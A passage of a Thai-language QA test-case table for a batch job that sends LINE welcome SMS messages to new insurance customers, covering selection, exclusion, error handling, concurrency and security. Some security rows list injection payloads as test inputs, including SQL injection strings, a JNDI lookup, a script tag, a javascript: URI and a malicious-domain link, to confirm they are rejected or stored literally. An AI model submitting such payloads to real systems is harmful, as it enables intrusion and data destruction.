| TC-013 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Message | fallback ไป SMS_CATEGORY | ไม่มี schedule แต่มี msg_text | 1. ลบ schedule 2. รัน batch 3. เทียบข้อความ | ข้อความสร้างจาก msg_text ของ SMS_CATEGORY code 113 | sms_category_code=113, name=MKTWelcomeNewCust | P1 | Not Run |  |  | - | FR-011, BR-006 |
| TC-014 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Message | แทนค่า $(var1)/$(var2) | มีชื่อลูกค้า + ลิงก์ active | 1. seed cf_catalog active 2. รัน batch 3. เทียบข้อความเต็ม | ข้อความตรงตัวอย่าง spec ไม่มี placeholder หลงเหลือ | fname=สมชาย, link=https://lin.ee/xd7mW2g | P1 | Not Run |  |  | - | FR-012, SC-005 |
| TC-015 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Delivery | เรียก ESB ส่ง SMS สำเร็จ | มีรายการพร้อมส่ง | 1. รัน batch 2. ตรวจการเรียก ESB 3. ตรวจ response | บริการตอบสำเร็จ ได้รับ refer_no | 1 record พร้อมส่ง | P1 | Not Run |  |  | - | FR-014, POST-001 |
| TC-016 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Logging | บันทึก CSMS_LOG + refer_no | ส่งสำเร็จ | 1. รัน batch 2. query CSMS_LOG | มี row ใหม่ พร้อม sms_category_name_abbr, sms_message, refer_no, สถานะ | refer_no=RF20260514100005001 | P1 | Not Run |  |  | - | FR-015, POST-002 |
| TC-017 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Logging | บันทึก WELCOME_NEW_CUST_LINE ครบทุก field | ส่งสำเร็จ | 1. รัน batch 2. query ตาราง 3. เทียบ 14 field | ทุก field ตรง (policy_no…created_date), created_by=SYSTEM_BATCH | 2445901/ORD/นาย/สมชาย/ใจดี/1409900111222 | P1 | Not Run |  |  | - | FR-016, POST-003 |
| TC-018 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Logging | ส่งสำเร็จ → sent_status='S' | ส่งสำเร็จ | 1. รัน batch 2. query ตาราง | sms_sent_date ไม่เป็น NULL, sent_status='S' | 2445901 | P1 | Not Run |  |  | - | FR-016a |
| TC-019 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Message | คำนวณ credit_amount ด้วย logic เดิม | ข้อความไทย 140 ตัว | 1. เตรียมข้อความ 140 ตัว 2. เรียก logic คำนวณ 3. เทียบกับ utility เดิม | credit_amount=2 ตรงกับ utility เดิมของ CSMS (reuse) | ข้อความ 140 ตัว UCS-2 | P2 | Not Run |  |  | - | FR-017, A-011, Q-005 · Unit |
| TC-020 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Notification | ล้มเหลวระดับรอบ → email แจ้งเตือน | จำลองความล้มเหลว 5 ขั้นตอน | 1. จำลอง failure แต่ละขั้น 2. รัน batch 3. ตรวจ email | email ถึง IT+User ระบุ batch name + ขั้นตอนที่ล้มเหลว, ไม่ส่ง SMS ต่อ | run_date=2026-05-15 · 5 failure steps | P1 | Not Run |  |  | - | FR-018, SC-004 · Outline 5 rows · ⚠F-007 timeout ไม่มีตัวเลข |
| TC-021 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | Manual Fix (Admin Dashboard) | Manual Trigger | Manual Batch ด้วยช่วงวันที่ถูกต้อง | IT Admin login แล้ว | 1. เปิดหน้า Manual Fix 2. เลือก batch 3. ระบุ 2026-05-15 → 2026-05-15 4. กด Manual Batch | ระบบเริ่มประมวลผลย้อนหลังเฉพาะช่วงที่เลือก ไม่มี validation error | batch=BATCH-CSMS-WELCOME-LINE, 2026-05-15 | P2 | Not Run |  |  | - | FR-019, Q-004 |
| TC-022 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | Manual Fix (Admin Dashboard) | Idempotency | Manual Batch ซ้ำ ไม่ส่งซ้ำ | ช่วงวันที่เคยรันบางส่วน (3 S + 2 NULL) | 1. seed 3 sent + 2 pending 2. สั่ง Manual Batch ซ้ำ 3. นับ SMS | ส่งเฉพาะ 2 รายการที่ sms_sent_date IS NULL · รวม 2 SMS | 2026-05-15 · 3 sent, 2 pending | P1 | Not Run |  |  | - | FR-020, EC-004, SC-003 |
| TC-023 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | Manual Fix (Admin Dashboard) | Manual Trigger | ช่วงวันที่ = วันประมวลผล → ดึง T-1 | ช่วง 2 วัน | 1. เลือก 2026-05-15 → 2026-05-16 2. รัน 3. ตรวจ issue_date ที่ดึง | วัน 05-15 ดึง issue_date=05-14 · วัน 05-16 ดึง issue_date=05-15 | 2026-05-15 → 2026-05-16 | P1 | Not Run |  |  | - | FR-020a |
| TC-024 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | Daily Report | Report | รายงานแสดงยอด + breakdown | batch รันเสร็จ 1 รอบ | 1. รัน batch 2. เปิดรายงานของวันนั้น 3. ตรวจทุกช่อง | แสดง total/สำเร็จ/ไม่สำเร็จ/ตัดออกแยกเหตุผล + breakdown ORD/IND/PA | run_date=2026-05-14 | P3 | Not Run |  |  | - | FR-021, SC-007, Q-006 |
| TC-025 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | E2E | E2E happy path ตาม spec US1 #1 | ข้อมูลครบตามตัวอย่าง spec | 1. seed ตามตัวอย่าง 2. รัน batch 10:00 3. ตรวจ SMS + 2 ตาราง | SMS ข้อความตรงตัวอย่างถึง 0845012341 · CSMS_LOG + WELCOME_NEW_CUST_LINE ครบ sent_status='S' | 2445901/ORD/สมชาย/0845012341/2026-05-13 | P1 | Not Run |  |  | - | SC-001 · spec US1 Acceptance #1 |
| TC-026 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Data Selection | สถานะ ≠ Inforce → ไม่ถูกดึง | issue_date=T-1 แต่สถานะอื่น | 1. seed 5 สถานะ 2. รัน batch 3. ตรวจกลุ่มเป้าหมาย | ไม่ปรากฏในกลุ่มเป้าหมาย ไม่มี SMS | Lapse/Pending/Cancelled/Surrender/NULL | P1 | Not Run |  |  | - | FR-002 · Outline 5 rows |
| TC-027 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Data Selection | issue_date ≠ T-1 → ไม่ถูกดึง | สถานะ Inforce แต่วันที่ไม่ตรง | 1. seed 4 วันที่ 2. รัน batch 3. ตรวจกลุ่มเป้าหมาย | ไม่ปรากฏในกลุ่มเป้าหมาย | T-0=2026-05-14, T-2=2026-05-12, T-30, อนาคต | P1 | Not Run |  |  | - | FR-002, BR-001 · Outline 4 rows |
| TC-028 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Data Selection | กรมธรรม์ก่อนปี 2026 → ไม่ถูกดึง | issue_date=T-1 แต่เป็นกรมธรรม์ปี 2025 | 1. seed กรมธรรม์ปี 2025 2. รัน batch 3. ตรวจกลุ่มเป้าหมาย | ไม่ปรากฏ ไม่ส่งย้อนหลังก่อน UR Go-live | 2445904, policy_year=2025 | P1 | Not Run |  |  | - | FR-003, A-006 · spec US1 #8 |
| TC-029 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Data Selection | เบอร์ว่าง → ไม่ถูกดึง | กรมธรรม์เข้าเงื่อนไขอื่นครบ | 1. seed 4 รูปแบบเบอร์ว่าง 2. รัน batch 3. ตรวจ + ตรวจการเรียก API | ไม่ปรากฏตั้งแต่ขั้นคัดเลือก · ไม่เรียก Line Connect | NULL, "", "   ", "\t" | P1 | Not Run |  |  | - | FR-004, EC-001 · Outline 4 rows |
| TC-030 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Exclusion | ORD ใน DNC (remark_code='1') → ตัดออก | เข้าเงื่อนไขอื่นครบ | 1. seed remark_code='1' 2. รัน batch 3. ตรวจการส่ง | ตัดออก ไม่ส่ง SMS | 2445901, policy_type='O', remark_code='1' | P1 | Not Run |  |  | - | FR-005, SC-002 · spec US1 #2 |
| TC-031 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Exclusion | IND/PA ใน DNC (remark_code='4') → ตัดออก | เข้าเงื่อนไขอื่นครบ | 1. seed remark_code='4' 3 แบบ 2. รัน batch 3. ตรวจการส่ง | ตัดออก ไม่ส่ง SMS | IND/I, IND/G, PA/P · remark_code='4' | P1 | Not Run |  |  | - | FR-005, SC-002 · Outline 3 rows |
| TC-032 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Exclusion | Mapping policy_type ก่อนตรวจ DNC | DNC บันทึกด้วยรหัสปลายทาง | 1. seed DNC ด้วย O/I/G/P 2. รัน batch 3. ตรวจ query + ผล | query ด้วยรหัสปลายทาง ตรวจพบและตัดออก · ห้ามใช้รหัสต้นทางตรง ๆ | ORD→O, IND→I, IND→G, PA→P | P1 | Not Run |  |  | - | FR-005, A-005, Q-001 · Outline 4 rows |
| TC-033 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Error Handling | E13 → skip + log + รอบเดินต่อ | 5 รายการ, รายการที่ 3 ได้ E13 | 1. mock E13 ที่ record 3 2. รัน batch 3. ตรวจ log + record 4-5 | record 3 skip ไม่ retry · log ครบ · record 4-5 ประมวลผลต่อ · ไม่มี email | code=E13 ที่ record 3/5 | P1 | Not Run |  |  | - | FR-008, SC-006, Q-003 · spec US1 #7 |
| TC-034 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Error Handling | ผลนอก 3 เงื่อนไข → skip + log | 5 รายการ, รายการที่ 2 ผิดปกติ | 1. mock 5 รูปแบบ response 2. รัน batch 3. ตรวจ log + รอบ | record 2 skip + log แยก · รอบไม่หยุด | channel=null, isBlockLine=null, code=E99, payload ว่าง, JSON ผิด | P1 | Not Run |  |  | - | FR-008a, EC-003 · Outline 5 rows |
| TC-035 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Error Handling | API ล่มทั้งระบบ → retry 3 → หยุดรอบ + email | Line Connect down ทั้งระบบ | 1. mock service down 2. รัน batch 3. นับ retry 4. ตรวจ email | retry 3 ครั้งเว้นช่วง · หยุดรอบ · email ระบุขั้นตอน · ไม่ skip รายรายการ | run_date=2026-05-15, 10 records, service down | P1 | Not Run |  |  | - | FR-008b, EC-007 · ⚠F-007 interval ไม่มีตัวเลข |
| TC-036 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Error Handling | ไม่พบชื่อลูกค้า → skip + log | card_no ไม่มีใน customer data | 1. seed card_no ที่ไม่มี match 2. รัน batch 3. ตรวจ log + SMS | skip + log · ไม่ส่งข้อความที่ไม่มีชื่อ · รอบไม่หยุด | card_no=9999999999999 | P1 | Not Run |  |  | - | FR-011a, EC-005 |
| TC-037 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Error Handling | ไม่มีลิงก์ active → หยุดรอบ + email | cf_catalog ไม่มีลิงก์ active | 1. seed 4 สถานะลิงก์ 2. รัน batch 3. ตรวจ SMS + email | หยุดรอบทั้งรอบ · 0 SMS · email ระบุ "ไม่มีลิงก์แคมเปญ active" | expire ผ่าน, begin ยังไม่ถึง, active_flag='N', ไม่มี row | P1 | Not Run |  |  | - | FR-012a, EC-006 · Outline 4 rows |
| TC-038 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | Manual Fix (Admin Dashboard) | Validation | ช่วงวันที่ผิด → validation | IT Admin อยู่หน้า Manual Fix | 1. กรอกช่วงวันที่ผิด 5 แบบ 2. กด Manual Batch 3. ตรวจข้อความ | validation + ข้อความมาตรฐาน · ไม่เริ่มประมวลผล · ไม่มี SMS | start>today, end<start, ว่าง 2 แบบ, format ผิด | P2 | Not Run |  |  | - | FR-019, MSG-004 · Outline 5 rows · spec US2 #3 |
| TC-039 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Logging | ไม่สำเร็จ/skip → sent_status='F' | รายการถูก skip/ส่งไม่สำเร็จ | 1. จำลอง 4 กรณี 2. รัน batch 3. query ตาราง | มี row · sms_sent_date IS NULL · sent_status='F' · reconcile ได้ | E13, out-of-spec, no name, send fail | P1 | Not Run |  |  | - | FR-016a · Outline 4 rows |
| TC-040 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Dedup | daily ไม่ retry 'F' อัตโนมัติ | มี 3 รายการ 'F' ค้างจากรอบก่อน | 1. seed 3 'F' ของ 05-14 2. รัน daily รอบ 05-15 3. ตรวจการส่ง | daily ประมวลผลเฉพาะ T-1 · ไม่ดึง 'F' ค้างมา retry · 'F' คงอยู่เพื่อ audit | 3 records sent_status='F', sms_sent_date NULL | P1 | Not Run |  |  | - | FR-020b |
| TC-041 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Delivery | Gateway ล้มเหลวรายรายการ → 'F' รอบไม่หยุด | 5 รายการ, รายการที่ 2 ล้มเหลว | 1. mock fail ที่ record 2 2. รัน batch 3. ตรวจสถานะทุก record | record 2 = 'F' · record 1,3,4,5 = 'S' · รอบไม่หยุด · ไม่มี email | 5 records, fail@2 | P1 | Not Run |  |  | - | FR-014, FR-016a · ⚠F-006 พฤติกรรมอนุมาน |
| TC-042 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Logging | refer_no ผิดรูปแบบ → พฤติกรรมไม่ระบุ | บริการตอบสำเร็จแต่ refer_no ผิดปกติ | 1. mock refer_no 5 แบบ 2. รัน batch 3. ตรวจ CSMS_LOG + sent_status | [NEEDS CLARIFICATION] QA เสนอ 'F' + log · ต้องให้ SA ยืนยันก่อน execute | null, "", "   ", "ERR", ยาว 500 ตัว | P2 | Not Run |  |  | - | FR-015 · **⚠F-006 BLOCKED** (CHK024/G5) |
| TC-043 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Message | ไม่พบ template ทุกแหล่ง → ปลายทางไม่ระบุ | ไม่มีทั้ง schedule และ msg_text | 1. ลบ template ทั้ง 2 แหล่ง 2. รัน batch 3. ตรวจพฤติกรรม | [NEEDS CLARIFICATION] QA เสนอ หยุดรอบ + email · ห้ามส่งข้อความว่าง/placeholder ดิบ | schedule=none, msg_text=NULL | P2 | Not Run |  |  | - | FR-011 · **⚠F-008 BLOCKED** |
| TC-044 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Data Selection | ขอบเขต issue_date | run_date=2026-05-14 | 1. seed 4 timestamp ขอบ 2. รัน batch 3. ตรวจกลุ่มเป้าหมาย | T-1 00:00:00 และ 23:59:59 ปรากฏ · T-0 และ T-2 ไม่ปรากฏ | 2026-05-13 00:00:00 / 23:59:59 / 2026-05-14 00:00:00 / 2026-05-12 23:59:59 | P2 | Not Run |  |  | - | FR-002 · Outline 4 rows |
| TC-045 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Data Selection | ขอบเขตปี Go-live | ข้ามปี | 1. seed 2 กรมธรรม์คร่อมปี 2. รัน batch 3. ตรวจกลุ่มเป้าหมาย | 2025-12-31 ไม่ปรากฏ · 2026-01-01 ปรากฏ | issue_date=2025-12-31 / 2026-01-01 | P1 | Not Run |  |  | - | FR-003, A-006 · Outline 2 rows |
| TC-046 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Dedup | tie-break MIN(policy_no) | 2 กรมธรรม์ issue_date เท่ากัน | 1. seed 2 กรมธรรม์วันเดียวกัน 2. รัน batch 3 ครั้ง 3. เทียบผล | เลือก policy_no น้อยสุด (2445907) · รันซ้ำได้ผลเดิมทุกครั้ง | สมหญิง/รักดี/0899000111 · 4220003, 2445907 · issue_date=2026-05-13 | P2 | Not Run |  |  | - | FR-009, EC-002, A-007 |
| TC-047 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Message | ขอบเขต begin_date/expire_date | run_date=2026-05-14 | 1. seed 4 ช่วงวันที่ 2. รัน batch 3. ตรวจการส่ง | begin/expire = วันประมวลผล → inclusive ส่งได้ · นอกช่วง → หยุดรอบ (FR-012a) | begin/expire 4 ชุด | P2 | Not Run |  |  | - | FR-012, SC-005 · Outline 4 rows · inclusive เป็นการอนุมาน |
| TC-048 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Message | ชื่อ unicode → render ถูกต้อง | ชื่อลูกค้าหลากรูปแบบ | 1. seed 7 รูปแบบชื่อ 2. รัน batch 3. ตรวจข้อความ + credit | ชื่อครบไม่ถูกตัด ไม่ mojibake · credit คำนวณจากความยาวจริง · ลิงก์ครบ | emoji, NBSP, RTL, combining, full-width, null byte | P2 | Not Run |  |  | - | FR-012, FR-011 · Outline 7 rows · catalog §B |
| TC-049 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Dedup | dedup bypass ด้วย whitespace/unicode | ลูกค้าเดียวกัน key ต่างกันเล็กน้อย | 1. seed 6 variant 2. รัน batch 3. นับ SMS | ได้รับ SMS 1 ข้อความ · ระบบ normalize (trim/collapse/NFC) ก่อนเทียบ | trailing space, NBSP, leading space, เบอร์มีขีด, NFD vs NFC | P2 | Not Run |  |  | - | FR-009, SC-003 · Outline 6 rows · normalize rule ไม่มีใน spec |
| TC-050 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Data Selection | รูปแบบ mobile_no ผิดปกติ | เบอร์หลายรูปแบบ | 1. seed 8 รูปแบบ 2. รัน batch 3. ตรวจการส่ง | 10 หลักส่งได้ · 9/11 หลัก/มีตัวอักษร ควร reject+log · รูปแบบอื่น [NEEDS CLARIFICATION] | 0845012341, 084-501-2341, +66..., 9 หลัก, 11 หลัก, ตัวอักษร, เบอร์บ้าน | P2 | Not Run |  |  | - | FR-004 · Outline 8 rows · ไม่มี format validation ใน spec |
| TC-051 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Message | ความยาวข้อความสุดขอบ | ข้อความยาวหลายระดับ | 1. เตรียม 6 ความยาว 2. รัน batch 3. ตรวจ credit + คอลัมน์ | credit ตาม logic เดิม · sms_message ไม่ถูก truncate เงียบ | 70/71/134/135/140/500 ตัว | P2 | Not Run |  |  | - | FR-016, FR-017, A-011 · Outline 6 rows · ไม่มี char limit |
| TC-052 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | Manual Fix (Admin Dashboard) | Validation | ช่วงวันที่สุดขอบ | today=2026-05-17 | 1. กรอก 5 ช่วง 2. กด Manual Batch 3. ตรวจผล | 1 วัน/17 วัน ประมวลผลได้ · ปี 9999 reject · ก่อน Go-live → 0 รายการ | 1 วัน, 17 วัน, 137 วัน, 9999, 2025-12-30 | P3 | Not Run |  |  | - | FR-020a, FR-019 · Outline 5 rows · ไม่มีเพดานช่วง |
| TC-053 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Scheduler | รอบว่าง 0 รายการ | ไม่มีกรมธรรม์เข้าเงื่อนไข | 1. ล้างข้อมูล T-1 2. รัน batch 3. ตรวจ email + รายงาน | รอบจบสำเร็จ · 0 SMS · **ไม่ส่ง email** · รายงานแสดง 0 ทุกช่อง ไม่ error | run_date=2026-05-14, 0 records | P2 | Not Run |  |  | - | FR-001, FR-018, FR-021 |
| TC-054 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Integration | Line Connect list lookup ปริมาณสูง | ลูกค้าจำนวนมากในรอบ | 1. seed 1/100/1000/10000 ราย 2. รัน batch 3. ตรวจความครบ | ได้ผลครบทุก cardNo หรือ chunk ถูกต้องไม่มีตกหล่น · HTTP 429 → FR-008b ไม่ skip เงียบ | 1, 100, 1000, 10000 cardNo | P2 | Not Run |  |  | - | FR-006, A-002 · Outline 4 rows · **⚠F-005** ไม่มีเกณฑ์ perf |
| TC-055 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Concurrency | daily + Manual Fix พร้อมกัน | ทั้งคู่ target ช่วงเดียวกัน | 1. เริ่ม daily 10:00:00 2. สั่ง Manual Fix 10:00:02 3. นับ SMS ต่อราย | ลูกค้าได้ SMS ไม่เกิน 1 · row 'S' ไม่เกิน 1 ต่อ key · มีกลไกกัน concurrent run | 5 records, 2026-05-15 | P1 | Not Run |  |  | - | FR-001, FR-020, SC-003 · กลไกไม่ระบุใน spec |
| TC-056 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Concurrency | race condition ตรวจประวัติ (TOCTOU) | 2 process อ่านประวัติพร้อมกัน | 1. บังคับให้ 2 process อ่านพร้อมกัน 2. ให้ทั้งคู่ส่ง 3. ตรวจจำนวน SMS + row | ส่งจริง 1 ข้อความ · row 'S' 1 row · มี unique constraint/lock ระดับ DB | 2445901/ORD/สมชาย/ใจดี | P1 | Not Run |  |  | - | FR-010, SC-003 · check-then-act ไม่มี lock ใน spec/plan |
| TC-057 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Concurrency | รอบทับซ้อน (overlap) | รอบก่อนยังไม่จบ | 1. ทำให้รอบ 05-14 ช้า 2. ปล่อยให้ถึง 10:00 ของ 05-15 3. ตรวจพฤติกรรม | ไม่รัน 2 รอบทับกันจนส่งซ้ำ · เลือก skip/queue/reject ที่ระบุได้ | รอบ 05-14 ค้าง, scheduler ทริก 05-15 | P2 | Not Run |  |  | - | FR-001 · overlap policy ไม่ระบุ · เกี่ยวโยง TC-088 |
| TC-058 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | Manual Fix (Admin Dashboard) | Concurrency | 2 admin กด Manual Batch พร้อมกัน | admin1 + admin2 ช่วงเดียวกัน | 1. ทั้งคู่กดภายใน <1 วินาที 2. ตรวจจำนวนรอบ + SMS | ประมวลผลรอบเดียว หรือรอบที่ 2 ถูกปฏิเสธพร้อมข้อความ · SMS ไม่เกิน 1 ต่อราย · log ระบุผู้ทริก | admin1, admin2, 2026-05-15 | P2 | Not Run |  |  | - | FR-019, FR-020 |
| TC-059 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Security | ข้อความ SMS ไม่มี PII/ข้อมูลอ่อนไหว | ลูกค้าเข้าเงื่อนไขส่ง | 1. รัน batch 2. ดึงข้อความที่ส่งจริง 3. ค้นหา 5 รูปแบบต้องห้าม | ข้อความไม่มี card_no/policy_no/จำนวนเงิน/issue_date/mobile_no · มีเพียงชื่อ+ลิงก์+1503 | card_no=1409900111222, policy_no=2445901 | P1 | Not Run |  |  | - | FR-012, Constitution II · Outline 5 rows |
| TC-060 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Security | ไม่มี PII แบบ plain ใน log | batch รันครบรอบ | 1. เปิด log ทุกระดับ 2. รัน batch 3. grep หา card_no/mobile_no ใน 6 sink | ไม่พบ PII แบบ plain · ถ้าจำเป็นต้อง mask (14099****222) | card_no=1409900111222, mobile_no=0845012341 | P1 | Not Run |  |  | - | FR-015, FR-016, Constitution IV · **⚠F-002/F-003 CRITICAL** ไม่มี NFR |
| TC-061 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Security | PII at rest ในตาราง | ตารางเก็บ PII plain | 1. ตรวจ GRANT ของตาราง 2. ตรวจ retention policy 3. ตรวจ audit การเข้าถึง | จำกัดสิทธิ์เฉพาะ service account · มี retention · ระบุผู้เข้าถึงได้ | WELCOME_NEW_CUST_LINE | P1 | Not Run |  |  | - | FR-016, Constitution IV · **⚠F-002/F-003 CRITICAL BLOCKED** |
| TC-062 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Security | DNC compliance + ลำดับการคัดกรอง | ลูกค้าใน DNC เข้าเงื่อนไขอื่นครบ | 1. seed DNC 3 แบบ 2. รัน batch 3. นับ SMS + ตรวจลำดับการเรียก API | SMS = 0 (SC-002) · คัดกรอง DNC เกิดก่อนเรียก Line Connect (ไม่ส่ง card_no ออกโดยไม่จำเป็น) | ORD/1, IND/4, PA/4 | P1 | Not Run |  |  | - | FR-005, SC-002, PDPA · Outline 3 rows · ⚠F-004 opt-out |
| TC-063 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | Manual Fix (Admin Dashboard) | Security | RBAC บน Manual Fix | ผู้ใช้หลาย role | 1. login 4 role 2. เรียก Manual Batch 3. ลอง POST ตรงไป endpoint | IT_ADMIN อนุญาต · role อื่น 403 · anonymous 401 · session หมดอายุ บังคับ login · endpoint ตรวจสิทธิ์ด้วย (ไม่ใช่ UI-only) | IT_ADMIN, business user, anonymous, expired session | P1 | Not Run |  |  | - | FR-019, Constitution III · Outline 4 rows · III ยกเว้นเฉพาะ approval ไม่ใช่ access |
| TC-064 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Security | ลิงก์แคมเปญอันตราย | cf_catalog ถูกแก้ | 1. seed 6 ค่าลิงก์ 2. รัน batch 3. ตรวจข้อความ + พฤติกรรม | โดเมนนอก whitelist/javascript: ควรปฏิเสธ+alert · script/SQL treat literal · ลิงก์ยาวควรมีเพดาน | evil.example.com, javascript:, <script>, SQL metachar, 2000 ตัว | P2 | Not Run |  |  | - | FR-012 · ไม่มี whitelist ใน spec · ค่าคาดหวังเป็นข้อเสนอ QA |
| TC-065 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Security | template injection | template ถูกแก้ | 1. seed 6 payload 2. รัน batch 3. ตรวจข้อความ + exception | $(var3) ไม่ส่งดิบ · JNDI/format string/SQL treat literal · template ว่าง ไม่ส่ง | $(var3), ${jndi:...}, %s %n, '; DROP TABLE--, ว่าง | P2 | Not Run |  |  | - | FR-011, FR-012 · Outline 6 rows |
| TC-066 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Security | PII in transit ไป API ภายนอก | เรียก Line Connect Inquiry | 1. ดัก traffic 2. ตรวจ scheme/cert 3. ตรวจ payload fields 4. ตรวจ log | TLS ไม่ใช่ plain HTTP · ส่งเฉพาะ cardNo/channels/types · ไม่แนบ mobile_no/fname/lname/policy_no · verify cert · ไม่ log plain | cardNo list | P1 | Not Run |  |  | - | FR-006, PDPA · **⚠F-002 CRITICAL** ไม่มี NFR |
| TC-067 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Security | SQL metachar เป็น literal | ข้อมูลต้นทางสกปรก | 1. seed 6 ค่า metachar 2. รัน batch 3. ตรวจ DB + dedup + error | parameterized · เก็บ literal · `%`/`_` ไม่ทำงานเป็น wildcard · ไม่มีตารางถูก drop · ไม่มี stack trace หลุด | '; DROP TABLE--, ' OR '1'='1, 100%, a_b, UNION SELECT, null byte | P1 | Not Run |  |  | - | FR-002/005/009/016 · Outline 6 rows · catalog §A (wildcard≠injection) |
| TC-068 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | Daily Report | Security | สิทธิ์เข้าถึงรายงาน | รายงานดึงจากตาราง PII | 1. login 4 role 2. เรียกรายงาน 3. ตรวจ drill-down | authorized เห็น aggregate · ไม่มีสิทธิ์ 403 · ไม่ login 401 · drill-down ต้อง mask หรือจำกัด role | business user, IT_ADMIN, unauthorized, anonymous | P2 | Not Run |  |  | - | FR-021, PDPA · **⚠F-002** ขอบเขต/สิทธิ์รายงานไม่ระบุ |
| TC-069 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Side-Effect | skip ไม่กระทบรายการที่ส่งแล้ว | 5 รายการ, 1-2 ส่งแล้ว, 3 skip | 1. ให้ record 3 ได้ E13 2. รัน batch 3. ตรวจ record 1-2 และ 4-5 | record 1-2 คง 'S' ไม่ rollback · ไม่มี transaction ย้อนผล · 4-5 ประมวลผลต่อ · CSMS_LOG ครบ | 5 records, E13@3 | P1 | Not Run |  |  | - | FR-008, SC-006 |
| TC-070 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Side-Effect | หยุดรอบกลางคัน ไม่มี orphan | 10 รายการ, 1-4 ส่งแล้ว แล้วเกิด failure | 1. จำลอง 4 เหตุหยุดรอบ 2. ตรวจ record 1-4 3. หา orphan/phantom | record 1-4 มีบันทึกครบ 'S' · ไม่มี orphan send (ส่งแล้วไม่บันทึก) · ไม่มี phantom (บันทึกแล้วไม่ส่ง) · 5-10 ซ่อมได้ | API down, no link, DB error, ESB down | P1 | Not Run |  |  | - | FR-008b, FR-012a, SC-004 · Outline 4 rows |
